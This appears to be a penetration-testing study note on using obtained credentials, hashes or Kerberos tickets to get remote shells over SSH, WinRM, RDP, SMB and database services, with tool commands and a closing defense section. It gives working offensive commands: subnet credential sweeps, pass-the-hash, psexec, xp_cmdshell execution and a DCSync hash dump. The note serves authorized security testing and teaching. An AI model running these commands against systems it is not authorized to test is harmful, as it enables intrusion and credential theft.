# Remote Access & Getting a Shell

How to **authenticate into a service and get command execution** once you have valid credentials (or a hash/key). This is the "front door": you already found the port open during [scanning](Networking%20Overview.md#scanning--enumeration-the-front-door) and you have creds from a [password attack](Password%20Attacks%20%26%20Brute%20Forcing.md), capture, or a provided account. Authorized engagements only — confirm the target is in scope before you connect.

> Once a shell lands, catch and stabilise it with [Shell](../Shell/README.md) — payloads, netcat, pwncat, TTY upgrade.

> Getting the *creds* is a separate problem — see [Password Attacks & Brute Forcing](Password%20Attacks%20%26%20Brute%20Forcing.md). Getting *code exec* from a web/service **vulnerability** (rather than valid creds) is out of scope for this note. Here we assume auth material and turn it into a session.

## Contents

- [Target: an IP or a name (FQDN)?](#target-an-ip-or-a-name-fqdn)
- [Quick reference — service → tool](#quick-reference--service--tool)
- [Linux services](#linux-services)
- [Windows & AD services](#windows--ad-services)
- [Database services (often a shortcut to OS exec)](#database-services-often-a-shortcut-to-os-exec)
- [Where the creds come from](#where-the-creds-come-from)
- [Defense / detection (put this in the report)](#defense--detection-put-this-in-the-report)

## Target: an IP or a name (FQDN)?

Every client below takes the target as **either a raw IP or a hostname/FQDN** — but which one you *must* use depends on the auth method:

- **Password / NT hash / SSH key → an IP is fine.** NTLM, Basic, and key auth don't care what you call the box, so `10.10.10.5` works everywhere.
- **Kerberos → use the FQDN, never the IP.** Tickets are issued for a Service Principal Name tied to the hostname (`host/dc01.corp.local`, `HTTP/dc01.corp.local`). Against a raw IP the KDC has no matching SPN and auth fails, so it's `-i dc01.corp.local`, not `-i 10.10.10.5`.
- **Make the name resolve.** If DNS doesn't point at the domain, add the host to `/etc/hosts` (`10.10.10.5  dc01.corp.local corp.local`), or — for Impacket/nxc — pass `-dc-ip <dc>` for KDC lookup and `-target-ip <ip>` to reach the service by IP while still authenticating to its name.

**Rule of thumb: NTLM / pass-the-hash → IP; Kerberos → FQDN.** (The AD `domain` also appears in the *credential*, e.g. `corp.local/Administrator` or `CORP\Administrator` — that's separate from the target host.)

## Quick reference — service → tool

| Port | Service | Get-in tool | Typical use |
| --- | --- | --- | --- |
| 22 | SSH | `ssh`, `sshpass`, key files | Linux/network-device shell |
| 23 | Telnet | `telnet` | Legacy Linux/IoT/network gear |
| 445 | SMB | `impacket-psexec`/`wmiexec`, `nxc` | Windows exec as local admin |
| 3389 | RDP | `xfreerdp`, `rdesktop`, `remmina` | Windows interactive desktop |
| 5985/5986 | WinRM | `evil-winrm`, `nxc winrm`, `Enter-PSSession` | Windows/AD PowerShell shell |
| 5900 | VNC | `vncviewer` | Any-OS remote desktop |
| 1433 | MSSQL | `impacket-mssqlclient` | DB shell → `xp_cmdshell` exec |
| 3306 | MySQL | `mysql` | DB access, creds loot |
| 5432 | Postgres | `psql` | DB access, `COPY ... PROGRAM` exec |
| 6379 | Redis | `redis-cli` | Unauth data / write-file abuse |
| 21 | FTP | `ftp`, `lftp` | File access / anon login |

A one-shot way to test many of these across a subnet with one credential is **NetExec** (`nxc <proto>`), which supports `smb`, `winrm`, `ssh`, `mssql`, `ldap`, `rdp`, and more.

```bash
# Where do these creds work? Sweep a protocol across a subnet
nxc smb   <subnet> -u <user> -p <pass>
nxc winrm <subnet> -u <user> -p <pass>
nxc ssh   <subnet> -u <user> -p <pass>
```

## Linux services

### SSH (22) — the standard Linux shell

```bash
# Password login
ssh user@<target>

# Non-interactive password (labs/scripts) — sshpass
sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no user@<target>

# Key-based login (found an id_rsa during looting)
chmod 600 id_rsa
ssh -i id_rsa user@<target>

# Crack a passphrase-protected key, then use it
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash
```

- Reused keys are common: an `id_rsa` looted from one host often opens others.
- SSH is also your pivot: see [Pivoting & tunneling](Networking%20Overview.md#pivoting--tunneling-turn-one-host-into-a-route) (`-L`, `-D`, `-J`).

### Telnet (23) — legacy / network gear

```bash
telnet <target>          # cleartext login prompt — creds go over the wire in the clear
```

Still found on old switches/routers/IoT. Because it's cleartext, it's both easy to abuse and easy to sniff.

### FTP (21) / VNC (5900)

```bash
ftp <target>                       # try anonymous:anonymous, then real creds
vncviewer <target>:5900            # -passwd file if you looted a VNC password
```

## Windows & AD services

### WinRM (5985/5986) — `evil-winrm`, the go-to Windows shell

WinRM gives a clean PowerShell session with no service artifact (contrast PsExec). Works with a password, an **NT hash** (pass-the-hash), or a **Kerberos ticket**. `-i` takes an IP for NTLM/PtH but an **FQDN** for Kerberos (see the target note above).

```bash
# --- Target by IP (NTLM: password or hash) ---
evil-winrm -i 10.10.10.5 -u Administrator -p 'Passw0rd!'     # password
evil-winrm -i 10.10.10.5 -u Administrator -H <nt-hash>       # pass-the-hash, no plaintext
evil-winrm -i 10.10.10.5 -u svc_web -p 'P@ss' -S            # -S = SSL/HTTPS (port 5986)
evil-winrm -i 10.10.10.5 -u svc_web -p 'P@ss' -P 5986 -S    # non-default port with -P

# --- Target by FQDN (required for Kerberos) ---
getTGT.py corp.local/Administrator:'Passw0rd!'              # request a TGT -> Administrator.ccache
export KRB5CCNAME=Administrator.ccache
evil-winrm -i dc01.corp.local -r CORP.LOCAL                 # realm UPPERCASE, set in /etc/krb5.conf
#   no -u needed: identity comes from the ccache
#   if DNS doesn't resolve it:  echo '10.10.10.5 dc01.corp.local corp.local' | sudo tee -a /etc/hosts

# Confirm WinRM is reachable / creds valid first — nxc prints (Pwn3d!) if you'll get a shell
nxc winrm 10.10.10.5      -u Administrator -p 'Passw0rd!'
nxc winrm dc01.corp.local -u Administrator -H <nt-hash> -k   # -k = Kerberos, so use the name
```

```powershell
# Native equivalent from a Windows box (by name = Kerberos; by IP = NTLM, may need TrustedHosts)
Enter-PSSession -ComputerName dc01.corp.local -Credential (Get-Credential)
```

evil-winrm extras once you're in: `upload`/`download`, `-s <scripts>` to load PS1s into memory, `menu` for loaded functions.

**Into a Domain Controller:** identical — a DC is just another WinRM target (`evil-winrm -i dc01.corp.local ...`); you only need **Domain Admin-level** rights on it, since a DC has no local admins of its own. Often you don't need the shell at all: with those rights, `secretsdump.py -just-dc` (DCSync) dumps every domain hash **remotely, no shell on the DC** — quieter. See [Impacket Toolkit](../AD/Impacket%20Toolkit.md).

### RDP (3389) — interactive desktop

```bash
# Linux clients
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore +clipboard /dynamic-resolution
rdesktop -u <user> -p '<pass>' <target>

# Pass-the-hash into RDP (requires Restricted Admin mode on the target)
xfreerdp /v:<target> /u:<user> /pth:<nt-hash>
```

`remmina` is a GUI alternative. Check the target allows RDP first (`nxc rdp <target> -u .. -p ..`).

### SMB (445) — remote exec as local admin

Covered in depth in the [Impacket Toolkit](../AD/Impacket%20Toolkit.md); the short version:

```bash
psexec.py <domain>/<admin>@<target>      # SYSTEM shell, creates a service (noisy)
wmiexec.py <domain>/<admin>@<target>     # semi-interactive, no service (quieter)
# both take -hashes :<nt-hash> for pass-the-hash
```

**Validate creds / find where you're local admin first (Metasploit).** `smb_login` confirms the account works and flags hosts where it's a local admin (`Admin!`) — those are your psexec targets. Equivalent to `nxc smb <target> -u <user> -p <pass> -d <domain>`.

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.129.1.18
set SMBUser p.walsh
set SMBPass Aut0mn-Temp-P@ss!
set SMBDomain vellum
run
```

See the [Metasploit](../Tools/Metasploit.md) note for spraying (`USER_FILE`/`PASS_FILE`), getting a shell (`exploit/windows/smb/psexec`), and pivoting; and [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) for choosing between SMB/WMI/WinRM/RDP when moving host-to-host.

## Database services (often a shortcut to OS exec)

A DB login frequently leads to command execution or credential loot.

```bash
# MSSQL — impacket client; then enable xp_cmdshell for OS commands
mssqlclient.py <domain>/<user>:<pass>@<target> -windows-auth
#   SQL> enable_xp_cmdshell
#   SQL> xp_cmdshell whoami

# MySQL / MariaDB
mysql -h <target> -u <user> -p'<pass>'

# PostgreSQL — COPY ... FROM PROGRAM gives exec on modern versions
psql -h <target> -U <user> -d postgres

# Redis (often unauthenticated on internal nets)
redis-cli -h <target>
```

## Where the creds come from

You need auth material for everything above. Get it from:

- [Password Attacks & Brute Forcing](Password%20Attacks%20%26%20Brute%20Forcing.md) — spray/brute/offline cracking across these same protocols.
- [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) — dumped hashes/tickets (pass-the-hash, pass-the-ticket).
- Looted keys/config on a foothold (`id_rsa`, `.pgpass`, saved RDP/VNC creds).

## Defense / detection (put this in the report)

- **SSH:** key-only auth (disable passwords), disable root login, fail2ban on 4625-equivalent auth failures, alert on logins from new source IPs.
- **WinRM / RDP:** restrict to admin/jump hosts, require NLA on RDP, disable Restricted Admin unless needed (kills PtH-over-RDP), MFA on remote access, monitor **4624 type 3/10** and WinRM operational logs.
- **SMB exec:** service creation (**7045**), writes to `ADMIN$`; disable NTLM where possible and enforce SMB signing.
- **Telnet / cleartext protocols:** remove them; they leak creds on the wire.
- **Databases:** never expose 1433/3306/5432/6379 to untrusted networks, disable `xp_cmdshell`, require auth on Redis, use least-privilege DB accounts.
- **Everywhere:** strong/unique passwords + lockout to blunt brute force, and log/alert on successful auth from unexpected accounts or hosts.
